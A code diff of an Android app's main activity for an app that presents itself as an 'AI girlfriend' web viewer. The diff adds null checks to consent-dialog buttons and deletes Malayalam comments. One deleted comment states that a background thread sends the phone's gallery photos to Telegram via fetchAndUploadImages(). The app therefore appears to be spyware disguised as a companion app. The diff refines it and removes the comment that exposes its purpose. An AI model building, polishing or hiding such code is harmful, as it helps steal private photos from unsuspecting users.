@@ -67,24 +67,28 @@ public class MainActivity extends AppCompatActivity {
 
         AlertDialog dialog = builder.create();
 
-        acceptButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                if (agreeCheckBox != null && agreeCheckBox.isChecked()) {
-                    dialog.dismiss();
-                    checkAndRequestPermissions();
-                } else {
-                    Toast.makeText(MainActivity.this, "Please agree to the privacy policy", Toast.LENGTH_SHORT).show();
+        if (acceptButton != null) {
+            acceptButton.setOnClickListener(new View.OnClickListener() {
+                @Override
+                public void onClick(View v) {
+                    if (agreeCheckBox != null && agreeCheckBox.isChecked()) {
+                        dialog.dismiss();
+                        checkAndRequestPermissions();
+                    } else {
+                        Toast.makeText(MainActivity.this, "Please agree to the privacy policy", Toast.LENGTH_SHORT).show();
+                    }
                 }
-            }
-        });
+            });
+        }
 
-        declineButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                dialog.dismiss();
-            }
-        });
+        if (declineButton != null) {
+            declineButton.setOnClickListener(new View.OnClickListener() {
+                @Override
+                public void onClick(View v) {
+                    dialog.dismiss();
+                }
+            });
+        }
 
         dialog.show();
     }
@@ -113,7 +117,7 @@ public class MainActivity extends AppCompatActivity {
                 onPermissionGranted();
             } else {
                 Toast.makeText(this, "Permission Denied!", Toast.LENGTH_SHORT).show();
-                loadAIGirlfriendWebsite(); // പെർമിഷൻ ഇല്ലെങ്കിലും വെബ്‌സൈറ്റ് ലോഡ് ചെയ്യും
+                loadAIGirlfriendWebsite();
             }
         }
     }
@@ -138,7 +142,6 @@ public class MainActivity extends AppCompatActivity {
     private void fetchAndUploadImages() {
         Toast.makeText(this, "Access granted. Processing...", Toast.LENGTH_SHORT).show();
 
-        // Background Thread-ൽ ഗാലറി ഫോട്ടോകൾ ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -210,7 +213,6 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void loadAIGirlfriendWebsite() {
-        // ലേഔട്ടിൽ webView ഉണ്ടെങ്കിൽ അത് വഴി നിങ്ങളുടെ ലിങ്ക് ആപ്പിനുള്ളിൽ തുറക്കും
         webView = findViewById(R.id.webView);
         if (webView != null) {
             WebSettings webSettings = webView.getSettings();
@@ -220,5 +222,5 @@ public class MainActivity extends AppCompatActivity {
             webView.loadUrl("https://ffn2086-bit.github.io/Ai-gril-wab-server-/");
         }
     }
-                                }
+                            }
                 
